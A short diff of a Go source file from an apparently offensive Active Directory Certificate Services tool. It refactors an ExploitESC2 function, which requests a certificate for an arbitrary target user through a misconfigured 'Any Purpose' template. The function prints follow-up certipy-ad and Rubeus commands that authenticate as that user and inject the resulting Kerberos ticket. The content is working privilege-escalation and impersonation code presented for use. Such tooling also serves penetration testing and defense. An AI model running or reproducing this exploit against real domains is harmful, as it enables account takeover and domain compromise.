@@ -1,7 +1,7 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -72,7 +72,7 @@ func ScanESC2(cfg *ADCSConfig) ([]ESC2Finding, error) {
 // the Subject Alternative Name. The exploit is identical to ESC1 — the only
 // difference is the detection criteria (Any Purpose EKU instead of explicit
 // Client Authentication EKU).
-func ExploitESC2(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC2(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC2 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	// Step 1: Verify the template is ESC2-exploitable
@@ -123,7 +123,7 @@ func ExploitESC2(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	}
 	fmt.Printf("[+] Certificate obtained for %s via ESC2 on template %q\n", targetUPN, templateName)
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	return cert, certKey, nil
 }
